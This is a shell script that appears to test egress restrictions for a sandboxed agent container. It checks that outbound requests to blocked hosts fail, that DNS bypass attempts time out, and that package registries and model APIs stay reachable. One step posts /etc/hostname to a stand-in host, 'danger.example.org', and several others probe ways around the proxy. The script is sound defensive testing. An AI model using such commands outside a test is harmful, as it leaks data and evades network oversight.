#!/bin/sh
# EGR-02 to EGR-04: runs in the worker container as the agent account (uid 10001).
set +e
export HOME=/tmp/agent-home; mkdir -p $HOME; cd $HOME
step() { printf '\n== %s\n' "$*"; }
step "id"; id
step "curl https://example.com (expect failure: name not resolved)"; curl -sS -m 10 -o /dev/null -w '%{http_code}\n' https://example.com; echo "exit=$?"
step "curl to example.com with a forced address (expect failure: proxy refuses)"; ip=23.192.228.80; curl -sS -m 10 --resolve example.com:443:$ip -o /dev/null -w '%{http_code}\n' https://example.com; echo "exit=$?"
step "curl https://danger.example.org/upload (expect failure)"; curl -sS -m 10 -X POST --data-binary @/etc/hostname https://danger.example.org/upload; echo "exit=$?"
step "plain HTTP to 1.1.1.1:80 (expect failure)"; curl -sS -m 8 -o /dev/null http://1.1.1.1/; echo "exit=$?"
step "DNS to 1.1.1.1 over UDP (expect timeout)"; python3 -c "
import socket
q=b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(5); s.sendto(q,('1.1.1.1',53))
try: print('ANSWERED', len(s.recv(512)))
except Exception as e: print('no answer:', type(e).__name__)"
step "DNS to 1.1.1.1 over TCP (expect failure)"; python3 -c "
import socket
s=socket.socket(); s.settimeout(5)
try: s.connect(('1.1.1.1',53)); print('CONNECTED')
except Exception as e: print('no connection:', type(e).__name__)"
step "resolve example.com through the host resolver (expect NXDOMAIN)"; getent hosts example.com; echo "exit=$?"
step "resolve github.com (expect an address)"; getent hosts github.com; echo "exit=$?"
step "git ls-remote https://github.com/peters/horizon HEAD"; timeout 60 git ls-remote https://github.com/peters/horizon HEAD; echo "exit=$?"
step "git clone --depth 1 https://github.com/octocat/Hello-World"; rm -rf hw; timeout 120 git clone -q --depth 1 https://github.com/octocat/Hello-World hw && ls hw; echo "exit=$?"
step "crates: sparse index entry and a crate download"; curl -sS -m 30 https://index.crates.io/cf/g-/cfg-if | head -c 80; echo; curl -sS -m 30 -L -o cfg-if.crate -w '%{http_code} %{size_download}\n' https://static.crates.io/crates/cfg-if/cfg-if-1.0.0.crate; echo "exit=$?"
step "npm install left-pad"; mkdir -p npmtest && cd npmtest && timeout 120 npm install --no-audit --no-fund left-pad@1.3.0 2>&1 | tail -2; ls node_modules; cd ..
step "PyPI and NuGet"; curl -sS -m 30 -o /dev/null -w '%{http_code}\n' https://pypi.org/simple/pip/; curl -sS -m 30 -o /dev/null -w '%{http_code}\n' https://api.nuget.org/v3/index.json; curl -sS -m 30 -L -o /dev/null -w 'nupkg %{http_code} %{size_download}\n' https://api.nuget.org/v3-flatcontainer/newtonsoft.json/13.0.3/newtonsoft.json.13.0.3.nupkg
step "model APIs reachable"; for u in https://api.openai.com/v1/models https://chatgpt.com/ https://auth.openai.com/ https://api.anthropic.com/v1/models; do curl -sS -m 20 -o /dev/null -w "$u %{http_code}\n" $u; done
step "gh api through the network (no token, public read)"; curl -sS -m 20 https://api.github.com/repos/peters/horizon -o /dev/null -w '%{http_code}\n'
